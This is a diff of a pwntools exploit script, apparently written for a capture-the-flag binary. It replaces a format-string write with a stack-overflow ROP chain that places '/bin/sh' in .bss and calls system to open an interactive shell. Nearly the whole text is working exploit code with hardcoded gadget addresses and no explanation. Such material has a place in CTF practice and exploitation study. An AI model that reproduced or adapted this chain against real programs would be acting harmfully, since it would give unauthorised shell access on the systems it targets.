@@ -63,11 +63,29 @@ def view(p, index):
     return ret
 
 def exploit(io,e):
-    print(e.sym.pwnme)
-    payload = fmtstr_payload(6, {e.sym.pwnme: 0x539}, write_size="int")
-    print(payload)
+    write_prim = 0x4006e5
+    pop_r8 = 0x4006ce
+    pop_rsi_r15 = 0x4006d7
 
-    sla(io, b">>>", payload) 
+    payload = b"A"*0x108
+    payload += p64(pop_r8)
+    payload += b"/bin/sh\x00"
+    payload += p64(pop_rsi_r15)
+    payload += p64(e.bss())
+    payload += p64(0xdeadbeef)
+    payload += p64(0xdeadbeef)
+    payload += p64(0xdeadbeef)
+    payload += p64(0x400813)
+    payload += p64(e.bss())
+    payload += p64(write_prim)
+    payload += p64(0xdeadbeef)
+    payload += p64(0xdeadbeef)
+    payload += p64(0x400546) # ret
+    payload += p64(e.plt["system"])
+
+    print(payload)
+    io.sendlineafter(b">>>", payload)
+
 
     io.interactive()
     
